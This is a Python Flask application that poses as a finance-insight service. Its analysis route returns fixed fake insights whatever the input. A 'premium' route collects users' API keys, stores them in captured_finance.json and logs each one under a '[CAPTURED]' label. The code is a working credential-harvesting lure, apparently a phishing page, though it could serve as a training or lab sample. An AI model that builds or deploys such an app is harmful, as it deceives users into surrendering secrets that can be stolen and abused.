from flask import Flask, render_template, request, redirect, url_for
import json
import os
from datetime import datetime

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURE_FILE = os.path.join(BASE_DIR, "captured_finance.json")


def ensure_capture_file():
    if not os.path.exists(CAPTURE_FILE):
        with open(CAPTURE_FILE, "w") as f:
            json.dump({"entries": []}, f, indent=2)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/analyze", methods=["POST"])
def analyze():
    text = request.form.get("text", "").strip()
    if not text:
        return redirect(url_for("index"))

    # Generate dummy insights based on input
    insights = [
        "Your expenses appear to be concentrated in a few major categories.",
        "Savings potential detected — you could optimize recurring charges.",
        "Investment diversification could improve your risk profile.",
    ]

    return render_template("result.html", insights=insights, input_summary=text[:120])


@app.route("/result")
def result():
    return render_template("result.html", insights=[], input_summary="")


@app.route("/premium")
def premium():
    return render_template("premium.html")


@app.route("/capture-finance", methods=["POST"])
def capture_finance():
    api_key = request.form.get("api_key", "").strip()
    if not api_key:
        return redirect(url_for("premium"))

    ensure_capture_file()

    with open(CAPTURE_FILE, "r") as f:
        data = json.load(f)

    entry = {
        "api_key": api_key,
        "timestamp": datetime.now().isoformat(),
    }

    data["entries"].append(entry)

    with open(CAPTURE_FILE, "w") as f:
        json.dump(data, f, indent=2)

    print(f"\n[CAPTURED] API Key: {api_key}")
    print(f"[CAPTURED] Timestamp: {entry['timestamp']}\n")

    return redirect(url_for("success"))


@app.route("/success")
def success():
    return render_template("success.html")


if __name__ == "__main__":
    ensure_capture_file()
    app.run(debug=True, port=5000)
